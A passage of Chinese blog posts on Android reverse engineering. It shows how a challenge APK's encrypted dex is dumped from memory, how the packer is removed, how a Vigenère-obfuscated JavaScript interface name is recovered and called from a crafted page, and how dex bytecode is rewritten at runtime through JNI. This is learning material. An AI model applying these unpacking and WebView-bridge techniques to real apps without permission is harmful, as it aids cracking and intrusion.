std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57); v23 = &amp;v54;LABEL_44: std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v23); _android_log_print(3, \"debug\", \"exit parse_dex\"); return 0; &#125; _android_log_print(6, \"debug\", \"fail to patch dex\"); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57); v24 = &amp;v54;LABEL_46: std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v24); _android_log_print(3, \"debug\", \"exit parse_dex error\"); return -1;&#125; 在 openWithHeader 中，log 了三次 dex 的 magic number，中间分别进行了 RC4 解密和 LZMA 解压缩。最后得到的结果应该就是最终的 dex 文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124int __fastcall ali::EncFile::openWithHeader(ali::EncFile *this, unsigned __int8 **a2, unsigned int *a3, unsigned int a4)&#123; ali::EncFile *v4; // r5 unsigned __int8 **v5; // r11 unsigned int *v6; // r6 unsigned int v7; // r7 const char *v8; // r2 int fd; // r8 int v10; // r10 __blksize_t v12; // r3 unsigned __int8 *v13; // r4 ali *v14; // r0 __int64 v15; // r0 __int64 v16; // ST18_8 unsigned int *v17; // r3 ali *v18; // r0 __int64 v19; // r0 int v20; // r8 int v21; // r3 char v22; // r2 unsigned __int64 v23; // r0 ali *v24; // r0 unsigned __int8 *v25; // r9 ali *v26; // ST24_4 __int64 v27; // r0 __int64 v28; // ST18_8 ali *v29; // r0 __int64 v30; // r0 size_t v31; // [sp+2Ch] [bp-9Ch] int v32; // [sp+30h] [bp-98h] char v33; // [sp+34h] [bp-94h] struct stat buf; // [sp+38h] [bp-90h] v4 = this; v5 = a2; v6 = a3; v7 = a4; if ( !*((_DWORD *)this + 2) ) &#123; v8 = \"file path is null\";LABEL_5: _android_log_print(6, \"debug\", v8); return 0; &#125; fd = open(*((const char **)this + 2), 0); v10 = fstat(fd, &amp;buf); if ( v10 ) &#123; v8 = \"fstat failed\"; goto LABEL_5; &#125; v12 = buf.st_blksize; *v6 = buf.st_blksize; *(_DWORD *)v4 = v12; v13 = (unsigned __int8 *)mmap(0, *v6, 3, 2, fd, 0); *((_DWORD *)v4 + 1) = v13; close(fd); v14 = (ali *)_android_log_print( 3, \"debug\", \"dex magic %c %c %c %c %c %c %c\",// original dex magic *v13, v13[1], v13[2], v13[3], v13[4], v13[5], v13[6]); LODWORD(v15) = ali::NanoTime(v14); v16 = v15; v18 = (ali *)ali::decryptRc4((ali *)v13, v13, (unsigned __int8 *)v6, v17);// RC4 decrypt LODWORD(v19) = ali::NanoTime(v18); ali::PrettyDuration((ali *)(v19 - v16), v19 - v16); _android_log_print(3, \"debug\", \"decrypted len:%u\", *v6); v20 = 0; _android_log_print( 3, \"debug\", \"after decrypt dex magic %c %c %c %c %c %c %c\",// dex magic after RC4 *v13, v13[1], v13[2], v13[3], v13[4], v13[5], v13[6]); v21 = (int)(v13 + 4); do &#123; v22 = 8 * v10++; v23 = (unsigned __int64)*(unsigned __int8 *)(v21++ + 1) &lt;&lt; v22; v20 += v23; &#125; while ( v10 != 8 ); _android_log_print(3, \"debug\", \"unpackSize: %u\", v20); *(_DWORD *)v4 = v7 + v20; v24 = (ali *)mmap(0, v7 + v20, 3, 34, -1, 0); *((_DWORD *)v4 + 1) = v24; v25 = (unsigned __int8 *)v24 + v7; v26 = v24; LODWORD(v27) = ali::NanoTime(v24); v31 = *v6; v28 = v27; v32 = v20; v29 = (ali *)LzmaDecode(v25, &amp;v32, v13 + 13, &amp;v31, v13, 5, 1, &amp;v33, &amp;off_54028);// LZMA uncompress LODWORD(v30) = ali::NanoTime(v29); ali::PrettyDuration((ali *)(v30 - v28), v30 - v28); munmap(v13, buf.st_blksize); _android_log_print( 3, \"debug\", \"after uncompressed dex magic %c %c %c %c %c %c %c\",// dex magic after LZMA *((unsigned __int8 *)v26 + v7), v25[1], v25[2], v25[3], v25[4], v25[5], v25[6]); *v6 = v20; if ( v5 ) *v5 = (unsigned __int8 *)*((_DWORD *)v4 + 1); return *((_DWORD *)v4 + 1);&#125; Dump Dex File知道了解析 dex 的流程，接下来就通过动态调试来吧 dex 文件 dump 下来。现在 BL 跳转到 openWithHeader 的语句处设下断点： 12345678.text:00026A7E loc_26A7E ; CODE XREF: parse_dex(_JNIEnv *,long long *)+622↑j.text:00026A7E MOV R1, R9 ; unsigned __int8 **.text:00026A80 MOV R2, R4 ; unsigned int *.text:00026A82 MOVS R3, #0x10 ; unsigned int.text:00026A84 BL _ZN3ali7EncFile14openWithHeaderEPPhPjj ; ali::EncFile::openWithHeader(uchar **,uint *,uint).text:00026A88 LDR.W R3, [R9].text:00026A8C ADDS R3, #0x10.text:00026A8E STR R3, [R6] 运行到断点处，单步步入 openWithHeader 函数，然后单步步过一直到 return，中间可以在 monitor 中用 tag:debug 过滤来查看 log。运行完后看到 log 输出的 magic number 已经是真实 dex 文件的样子了： 根据函数的返回值存放在 R0 中，可以看到 R0 所指向的部分是一个 dex 文件的数据了： 接下来我们可以把 dex 文件给 dump 下来。但文件的大小为多少？根据 dex 的数据结构，可以知道 dex 文件的大小位于偏移 0x20 处： 接下来使用 IDC 脚本来 dump 数据： 12345678910static main(void) &#123; auto fp, begin, end, len, b; fp = fopen(\"dump.dex\", \"wb\"); begin = 0x7584C010; // 解密后数据在内存中的位置 len = 0x0941FC; // 文件大小 end = begin + len; for (b = begin; b &lt; end; b++) &#123; fputc(Byte(b), fp); &#125;&#125; 最后将 dump 下来的数据放进 JEB 中，反汇编可以得到真实的 MainActivity 代码： Fix Application使用 AndroidKiller 反编译加固后的 apk，找到 AndroidManifest.xml，删除 Application 的 android:name 属性： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.ali.tg.testapp\" platformBuildVersionCode=\"23\" platformBuildVersionName=\"6.0-2438415\"&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/&gt; &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt; &lt;application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme\"&gt; &lt;activity android:label=\"@string/app_name\" android:name=\".MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\"/&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\".WebViewActivity\"/&gt; &lt;/application&gt;&lt;/manifest&gt; 回编译后，找到生成的 apk，压缩软件打开，替换我们 dump 出来的 classes.dex，同时删除 assets 文件夹，其他 so 文件不用管。修改完后重新签名打包并安装运行，可以正常使用。 Find Flag定位到真实的程序后，开始分析具体的内容。先来看 MainActivity，主要是一个点击事件，其中获取了 EditText 中的字符串并作为参数传入并启动 WebViewActivity： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.ali.tg.testapp;import android.app.Activity;import android.content.Intent;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.view.View$OnClickListener;import android.view.View;import android.widget.Button;import android.widget.EditText;public class MainActivity extends Activity &#123; class com.ali.tg.testapp.MainActivity$1 implements View$OnClickListener &#123; com.ali.tg.testapp.MainActivity$1(MainActivity arg1) &#123; MainActivity.this = arg1; super(); &#125; public void onClick(View arg6) &#123; ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); String v1 = MainActivity.this.edit.getText().toString(); // 获取EditText中的字符串 Intent v0 = new Intent(); v0.putExtra(ListViewAutoScrollHelpern.decrypt_native(\"dV.\", 2), v1); // 将v1的值传给Intent，变量名为“dV.”解密后的值 v0.setClass(MainActivity.this, WebViewActivity.class); // 设置Intent要跳转的类为WebViewActivity MainActivity.this.startActivity(v0); // 启动WebViewActivity &#125; &#125; Button btn_enter; View$OnClickListener btn_listener; EditText edit; public MainActivity() &#123; super(); this.btn_enter = null; this.edit = null; this.btn_listener = new com.ali.tg.testapp.MainActivity$1(this); &#125; protected void onCreate(Bundle arg4) &#123; ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); super.onCreate(arg4); this.setContentView(0x7F030000); this.edit = this.findViewById(0x7F060001); this.btn_enter = this.findViewById(0x7F060002); this.btn_enter.setOnClickListener(this.btn_listener); &#125;&#125; 然后来看看 WebViewActivity，主要就是新建了一个 JavaScriptInterface 对象，对象的名称同样被加密了。然后加载输入的 url，目标是最后能够成功调用对象 JavaScriptInterface 里的 showToast 方法。接下来需要根据密文解出对象名，并构造出相应的网页来弹出 Toast。不过这里好像 flag 就是“祥龙”，但还是继续往下尝试构造出能够弹 Toast 的方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package com.ali.tg.testapp;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.webkit.WebSettings;import android.webkit.WebView;import android.widget.Toast;public class WebViewActivity extends Activity &#123; public class JavaScriptInterface &#123; Context mContext; JavaScriptInterface(WebViewActivity arg1, Context arg2) &#123; WebViewActivity.this = arg1; super(); this.mContext = arg2; &#125; public void showToast() &#123; // 构造出一个页面能够调用这个函数就成功了 ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); Toast.makeText(this.mContext, \"祥龙！\", 0).show(); &#125; &#125; WebView wView; public WebViewActivity() &#123; super(); this.wView = null; &#125; protected void onCreate(Bundle arg7) &#123; ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); super.onCreate(arg7); this.setContentView(0x7F030001); this.wView = this.findViewById(0x7F060004); WebSettings v2 = this.wView.getSettings(); v2.setJavaScriptEnabled(true); v2.setJavaScriptCanOpenWindowsAutomatically(true); this.wView.addJavascriptInterface(new JavaScriptInterface(this, ((Context)this)), ListViewAutoScrollHelpern.decrypt_native(\"BQ1$*[w6G_\", 2)); // 添加一个JavascriptInterface对象，对象的变量名为“BQ1$*[w6G_”解密后的值 this.wView.loadUrl(this.getIntent().getStringExtra(ListViewAutoScrollHelpern.decrypt_native(\"dV.\", 2))); // 把在MainActivity中获取的变量作为url来加载 &#125;&#125; Crack接下来再看看 ListViewAutoScrollHelpern 中的 decrypt_native 方法，发现是在 Native 层中的 translate 库实现的： 123456789101112131415161718192021222324package android.support.v4.widget;import android.util.Log;public class ListViewAutoScrollHelpern &#123; static &#123; System.loadLibrary(\"translate\"); &#125; public ListViewAutoScrollHelpern() &#123; super(); &#125; public static native String decrypt_native(String arg0, int arg1) &#123; &#125; public static void testLogv(String arg1) &#123; Log.v(\"cheatecore\", arg1); &#125; public static void testLogw(String arg1) &#123; Log.w(\"cheatecore\", arg1); &#125;&#125; 然后将 libtranslat.so 载入 IDA。先看看 JNI_OnLoad，其中有两个函数 register_Algorithm 和 register_translate： 12345678910111213141516171819202122int __fastcall JNI_OnLoad(_JavaVM *a1)&#123; int v1; // r1 jint v2; // r2 _JNIEnv *v3; // r4 jint v4; // r0 bool v5; // cf int result; // r0 _JNIEnv *env; // [sp+4h] [bp-Ch] env = 0; if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;env, 65540) ) return -1; v3 = env; register_Algorithm(env, v1, v2); v4 = register_translate(v3); v5 = v4 &lt; 0; result = v4 &amp; (v4 &gt;&gt; 32); if ( !v5 ) result = 65540; return result;&#125; 在 register_Algorithm 中发现了目标函数： 12345678910111213int __fastcall register_Algorithm(_JNIEnv *a1, int a2, jint a3)&#123; _JNIEnv *v3; // r4 jclass v4; // r0 jclass v5; // r0 v3 = a1; v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, \"android/support/v4/widget/ListViewAutoScrollHelpern\"); v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v4, (const JNINativeMethod *)off_607C, 1); v5 = v3-&gt;functions-&gt;FindClass(&amp;v3-&gt;functions, \"android/support/v4/view/PagerTitleStripIcsn\"); v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v5, (const JNINativeMethod *)off_607C, 1); return 0;&#125; 定位到目标函数，发现其中调用了一个 vigenere_decrypt： 12345678910111213141516171819202122232425262728jstring __fastcall decrypt_native(_JNIEnv *a1, jobject a2, jstring a3, jint a4)&#123; jstring data; // r6 jint num; // r9 _JNIEnv *env; // r4 const char *v7; // r0 const char *v8; // r8 jstring v9; // r7 int v11; // [sp+4h] [bp+0h] data = a3; num = a4; env = a1; memset(&amp;v11, 0, 0x1000u); v7 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, data, 0); v8 = v7; if ( num == 2 ) &#123; vigenere_decrypt(v7, (char *)&amp;v11); v9 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, (const char *)&amp;v11); &#125; else &#123; v9 = data; &#125; env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, data, v8); return v9;&#125; 在 vigenere_decrypt 函数中，对输入的数据进行了解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263signed int __fastcall vigenere_decrypt(const char *ciphertext, char *plaintext)&#123; const char *ciphertext_1; // r8 char *plaintext_1; // r6 size_t len; // r0 char *v5; // r2 const char *table; // r3 signed int v7; // r7 int v8; // r0 int v9; // r1 int v10; // r5 int v11; // r0 int v12; // r10 char v13; // r3 signed int i; // r5 signed int result; // r0 signed int v16; // r9 int ch; // r3 char s; // [sp+4h] [bp-64h] char v19; // [sp+48h] [bp-20h] ciphertext_1 = ciphertext; plaintext_1 = plaintext; len = strlen(ciphertext); v5 = &amp;s; table = \"ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU\"; v7 = len; do &#123; v8 = *(_DWORD *)table; table += 8; v9 = *((_DWORD *)table - 1); *(_DWORD *)v5 = v8; *((_DWORD *)v5 + 1) = v9; v10 = (int)(v5 + 8); v5 += 8; &#125; while ( table != \"tCQU\" ); v11 = *(_DWORD *)table; v12 = 0; v13 = table[4]; *(_DWORD *)v10 = v11; *(_BYTE *)(v10 + 4) = v13; i = 0; result = strlen(&amp;s); v16 = result; while ( i &lt; v7 ) &#123; ch = (unsigned __int8)ciphertext_1[i]; if ( ch - 32 &lt;= (unsigned int)'^' ) // chr(ch) &lt;= 127 &#123; plaintext_1[i] = (ch - (unsigned __int8)*(&amp;v19 + v12 - 68) + 95) % 95 + 32;// &amp;v19 - 68 = &amp;table result = (v12 + 1) / v16; v12 = (v12 + 1) % v16; &#125; else // chr(ch) &gt; 127 &#123; plaintext_1[i] = ch; &#125; ++i; &#125; return result;&#125; 我先是通过动态调试来获取到了两个字符串的解密结果： 然后尝试自己实现一个解密函数进行验证： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char *table = \"ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU\";char *vigenere_decrypt(char *ciphertext) &#123; int j = 0; int len = strlen(ciphertext); printf(\"%d\\n\", len); char plaintext[len]; for (int i = 0; i &lt; len; i++) &#123; char ch = ciphertext[i]; if ((ch - 32) &lt;= 0x5E) &#123; plaintext[i] = (ch - table[j] + 95) % 95 + 32; j = (j + 1) % 16; &#125; else &#123; plaintext[i] = ch; &#125; &#125; plaintext[len] = '\\x00'; return plaintext;&#125;int main() &#123; char *ciphertext1 = \"dV.\"; char *plaintext1 = vigenere_decrypt(ciphertext1); printf(\"%s\\n\", plaintext1); // url char *ciphertext2 = \"BQ1$*[w6G_\"; char *plaintext2 = vigenere_decrypt(ciphertext2); printf(\"%s\\n\", plaintext2); // SmokeyBear return 0;&#125; 当然这里也可以 Hook 这个 so 文件，也可以直接编写代码调用 so 中的函数，条条大路通罗马。最后实现一个调用 Toast 的 html 页面： 12345678910111213141516&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;script type=\"text/javascript\"&gt; function alicrack() &#123; SmokeyBear.showToast(); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Crack EvilAPK_3 &lt;script type=\"text/javascript\"&gt; alicrack(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 在软件中输入对应的地址，成功弹窗： Referenceshttps://xz.aliyun.com/t/383https://blog.csdn.net/AliMobileSecurity/article/details/53259788https://yq.aliyun.com/articles/64691http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"Android逆向入门（四）","slug":"[TODO]Android逆向入门（四）","date":"2020-02-14T06:21:40.000Z","updated":"2020-02-25T07:02:46.565Z","comments":true,"path":"2020/02/14/[TODO]Android逆向入门（四）/","link":"","permalink":"blog.b3ale.cn/2020/02/14/[TODO]Android逆向入门（四）/","excerpt":"Android 加壳和脱壳入门。","text":"Android 加壳和脱壳入门。 dex 文件格式Android 程序编译以后生成 apk 文件，里面的 classes.dex 文件存放着程序运行的字节码，dex 文件是可以直接在 Dalvik 虚拟机中加载运行的文件。由于 Dalvik 是一种针对嵌入式设备而特殊设计的 Java 虚拟机，所以 dex 文件与标准的 class 文件在结构设计上有着本质的区别。当 Java 程序编译成 class 后，还需要使用 dx 工具将所有的 class 文件整合到一个 dex 文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，dex 文件是传统 jar 文件大小的 50% 左右。要想手工脱壳，必须先了解 dex 的文件格式。 ShakaApktool 使用 bs 命令即可对 class.dex 实现反编译回 smali 文件字节码，而使用 s 命令可以把 smali 字节码编译为 class.dex 文件： 12java -jar ShakaApktool bs classes.dex -o smali-dirjava -jar ShakaApktool s smali-dir -o example.dex dex 文件的数据结构大概如下： 数据名称 解释 header dex 文件头部，记录整个 dex 文件的相关属性 string_ids 字符串数据索引，记录了每个字符串在数据区的偏移量 type_ids 类似数据索引，记录了每个类型的字符串索引 proto_ids 原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表 field_ids 字段数据索引，记录了所属类，类型以及方法名 method_ids 类方法索引，记录方法所属类名，方法声明以及方法名等信息 class_defs 类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量 data 数据区，保存了各个类的真是数据 link_data 连接数据区 这里先看一下 Android 源码，首先在 /dalvik/vm/Common.h 中对数据类型有一个重命名： 1234567891011/* * These match the definitions in the VM specification. */typedef uint8_t u1;typedef uint16_t u2;typedef uint32_t u4;typedef uint64_t u8;typedef int8_t s1;typedef int16_t s2;typedef int32_t s4;typedef int64_t s8; 所有 dex 文件相关的数据结构都在 /dalvik/libdex/DexFile.h 中。dex 文件的结构如下： 123456789101112131415161718192021222324252627282930313233343536/* * Structure representing a DEX file. * * Code should regard DexFile as opaque, using the API calls provided here * to access specific structures. */struct DexFile &#123; /* directly-mapped \"opt\" header */ const DexOptHeader* pOptHeader; /* pointers to directly-mapped structs and arrays in base DEX */ const DexHeader* pHeader; const DexStringId* pStringIds; const DexTypeId* pTypeIds; const DexFieldId* pFieldIds; const DexMethodId* pMethodIds; const DexProtoId* pProtoIds; const DexClassDef* pClassDefs; const DexLink* pLinkData; /* * These are mapped out of the \"auxillary\" section, and may not be * included in the file. */ const DexClassLookup* pClassLookup; const void* pRegisterMapPool; // RegisterMapClassPool /* points to start of DEX file data */ const u1* baseAddr; /* track memory overhead for auxillary structures */ int overhead; /* additional app-specific data structures associated with the DEX */ //void* auxData;&#125;; dex 文件结构分别为文件头、索引区和数据区： dex 文件头文件头中简单记录了 dex 文件的一些基本信息，以及大致的数据分布。长度固定为 0x70，其中每一项信息所占用的内存空间也是固定的，好处是虚拟机在处理 dex 时不用考虑 dex 文件的多样性： 字段名称 偏移值 长度 说明 magic 0x00 8 魔数字段，值为”dex\\n035\\0” checksum 0x08 4 校验码 signature 0x0c 20 sha-1 签名 file_size 0x20 4 dex 文件总长度 header_size 0x24 4 文件头长度，009 版本=0x5c,035 版本=0x70 endian_tag 0x28 4 标示字节顺序的常量 link_size 0x2c 4 链接段的大小，如果为 0 就是静态链接 link_off 0x30 4 链接段的开始位置 map_off 0x34 4 map 数据基址 string_ids_size 0x38 4 字符串列表中字符串个数 string_ids_off 0x3c 4 字符串列表基址 type_ids_size 0x40 4 类列表里的类型个数 type_ids_off 0x44 4 类列表基址 proto_ids_size 0x48 4 原型列表里面的原型个数 proto_ids_off 0x4c 4 原型列表基址 field_ids_size 0x50 4 字段个数 field_ids_off 0x54 4 字段列表基址 method_ids_size 0x58 4 方法个数 method_ids_off 0x5c 4 方法列表基址 class_defs_size 0x60 4 类定义标中类的个数 class_defs_off 0x64 4 类定义列表基址 data_size 0x68 4 数据段的大小，必须 4k 对齐 data_off 0x6c 4 数据段基址 文件头的数据结构如下： 12345678910111213141516171819202122232425262728/* * Direct-mapped \"header_item\" struct. */struct DexHeader &#123; u1 magic[8]; /* includes version number */ u4 checksum; /* adler32 checksum */ u1 signature[kSHA1DigestLen]; /* SHA-1 hash */ u4 fileSize; /* length of entire file */ u4 headerSize; /* offset to start of next section */ u4 endianTag; u4 linkSize; u4 linkOff; u4 mapOff; u4 stringIdsSize; u4 stringIdsOff; u4 typeIdsSize; u4 typeIdsOff; u4 protoIdsSize; u4 protoIdsOff; u4 fieldIdsSize; u4 fieldIdsOff; u4 methodIdsSize; u4 methodIdsOff; u4 classDefsSize; u4 classDefsOff; u4 dataSize; u4 dataOff;&#125;; 索引区索引区包括 string_ids、type_ids、proto_ids、field_ids、method_ids 几个数据结构。数组结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940/* * Direct-mapped \"string_id_item\". */struct DexStringId &#123; u4 stringDataOff; /* file offset to string_data_item */&#125;;/* * Direct-mapped \"type_id_item\". */struct DexTypeId &#123; u4 descriptorIdx; /* index into stringIds list for type descriptor */&#125;;/* * Direct-mapped \"field_id_item\". */struct DexFieldId &#123; u2 classIdx; /* index into typeIds list for defining class */ u2 typeIdx; /* index into typeIds for field type */ u4 nameIdx; /* index into stringIds for field name */&#125;;/* * Direct-mapped \"method_id_item\". */struct DexMethodId &#123; u2 classIdx; /* index into typeIds list for defining class */ u2 protoIdx; /* index into protoIds for method prototype */ u4 nameIdx; /* index into stringIds for method name */&#125;;/* * Direct-mapped \"proto_id_item\". */struct DexProtoId &#123; u4 shortyIdx; /* index into stringIds for shorty descriptor */ u4 returnTypeIdx; /* index into typeIds list for return type */ u4 parametersOff; /* file offset to type_list for parameter types */&#125;; 数据区数据段包括 class_defs、data、link_data，数据结构如下： 1234567891011121314151617181920212223242526272829303132333435363738/* * Direct-mapped \"map_item\". */struct DexMapItem &#123; u2 type; /* type code (see kDexType* above) */ u2 unused; u4 size; /* count of items of the indicated type */ u4 offset; /* file offset to the start of data */&#125;;/* * Direct-mapped \"map_list\". */struct DexMapList &#123; u4 size; /* #of entries in list */ DexMapItem list[1]; /* entries */&#125;;/* * Direct-mapped \"class_def_item\". */struct DexClassDef &#123; u4 classIdx; /* index into typeIds for this class */ u4 accessFlags; u4 superclassIdx; /* index into typeIds for superclass */ u4 interfacesOff; /* file offset to DexTypeList */ u4 sourceFileIdx; /* index into stringIds for source file name */ u4 annotationsOff; /* file offset to annotations_directory_item */ u4 classDataOff; /* file offset to class_data_item */ u4 staticValuesOff; /* file offset to DexEncodedArray */&#125;;/* * Link table. Currently undefined. */struct DexLink &#123; u1 bleargh;&#125;; 动态代码自修改（加壳原理）DexClassDef -&gt; DexClassData -&gt; DexMethod -&gt; DexCode -&gt; insns 1234567891011121314151617181920/* * Direct-mapped \"code_item\". * * The \"catches\" table is used when throwing an exception, * \"debugInfo\" is used when displaying an exception stack trace or * debugging. An offset of zero indicates that there are no entries. */struct DexCode &#123; u2 registersSize; // 使用的寄存器个数 u2 insSize; // 参数个数 u2 outsSize; // 调用其他方法时使用的寄存器个数 u2 triesSize; // Try/Catch的个数 u4 debugInfoOff; // 指令调试信息的偏移 /* file offset to debug info stream */ u4 insnsSize; // 指令集个数，以2字节为单位 /* size of the insns array, in u2 units */ u2 insns[1]; // 指令集 /* followed by optional u2 padding */ /* followed by try_item[triesSize] */ /* followed by uleb128 handlersSize */ /* followed by catch_handler_item[handlersSize] */&#125;; 其中，insns 的值是用于存放程序实现代码的地方。程序执行的时候会把整个 dex 文件加载到内存之中，然后动态地解析执行 insns 中的内容。只要修改了里面的数据，就相当于修改了程序执行流程。 修改 insns直接在内存中修改 定位到 dex 文件 计算函数的 DexCode 位置 重写 DexCode 的 insns 数据 JNI BridgeJNI 提供了让我们在 C++代码层中直接操作 Dalvik（Java）数据的接口，可以直接在 JNI 中操作相关数据来修改 Android 中的代码。 Object 结构体Android 运行时，解析 dex 文件，并生成相关的结构体：DvmDex。其中存储了各种字符串、类、方法等信息。加载的时候，调用 dvmDexFileOpenPartial 对 dex 文件进行解析，并转化为可执行的结构体，这也是这个函数可以作为脱壳用的函数的原因之一。（以前的爱加密可以直接通过 Hook 这个函数进行脱壳）。 其中 Method 结构体是根据 DexMethod 生成的执行方法类。Dalvik 执行代码时，都是从 Method 中取出代码来执行的。因此可以直接通过操作 Method 结构体来修改执行的代码。 Example首先新建一个 JNI 项目，并新建两个函数 ret1() 和 ret2() 函数，以及一个 Native 函数 changeMethod()： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.assassinq.editdexfile;import android.os.Bundle;import com.google.android.material.floatingactionbutton.FloatingActionButton;import androidx.appcompat.app.AppCompatActivity;import androidx.appcompat.widget.Toolbar;import android.util.Log;import android.view.View;import android.view.Menu;import android.view.MenuItem;import java.lang.reflect.Method;public class MainActivity extends AppCompatActivity &#123; static &#123; System.loadLibrary(\"hello\"); &#125; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Toolbar toolbar = findViewById(R.id.toolbar); setSupportActionBar(toolbar); FloatingActionButton fab = findViewById(R.id.fab); fab.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; try &#123; Method m = MainActivity.class.getMethod(\"ret1\"); Log.d(\"DEBUG\", \"Return Value = \" + ret1()); changeMethod(m); Log.d(\"DEBUG\", \"Return Value = \" + ret1()); &#125; catch (Exception e) &#123;// e.printStackTrace(); Log.d(\"EXCEPTION\", Log.getStackTraceString(e)); &#125; &#125; &#125;); &#125; @Override public boolean onCreateOptionsMenu(Menu menu) &#123; // Inflate the menu; this adds items to the action bar if it is present. getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; @Override public boolean onOptionsItemSelected(MenuItem item) &#123; // Handle action bar item clicks here. The action bar will // automatically handle clicks on the Home/Up button, so long // as you specify a parent activity in AndroidManifest.xml. int id = item.getItemId(); //noinspection SimplifiableIfStatement if (id == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125; public int ret1() &#123; return 1; &#125; public int ret2() &#123; return 2; &#125; // public native void changeMethod(Method r1);&#125; 先编译生成一个不包含 JNI 的 apk，解压后取出其中的 classes.dex，然后在 010 Editor 中用 DEX Template 解析，找到 DexCode 中的 insns，并记录下 ret1() 和 ret2() 的字节码： 然后完善 JNI 函数，并且需要导入 Android 源码中 Dalvik 文件夹下相关的头文件。JNI 实现如下，将 ret1() 所指向的字节码修改为 ret2() 的字节码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;jni.h&gt;#include &lt;string.h&gt;#include &lt;android/log.h&gt;#include \"Object.h\"#include \"Common.h\"#ifdef LOG_TAG#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endifconst char insns[] = &#123;0x12, 0x20, 0x0F, 0x00&#125;;void changeMethod(JNIEnv *env, jobject obj, jobject method) &#123; /* * 12 10 0F 00 -&gt; ret 1 * 12 20 0F 00 -&gt; ret 2 */ Method *pMethod = (Method *) env-&gt;FromReflectedMethod(method); pMethod-&gt;insns = (const u2*) insns;&#125;static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) &#123; jclass clazz; clazz = env-&gt;FindClass(className); if (clazz == NULL) &#123; return JNI_FALSE; &#125; if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123; return JNI_FALSE; &#125; return JNI_TRUE;&#125;static const char *gClassName = 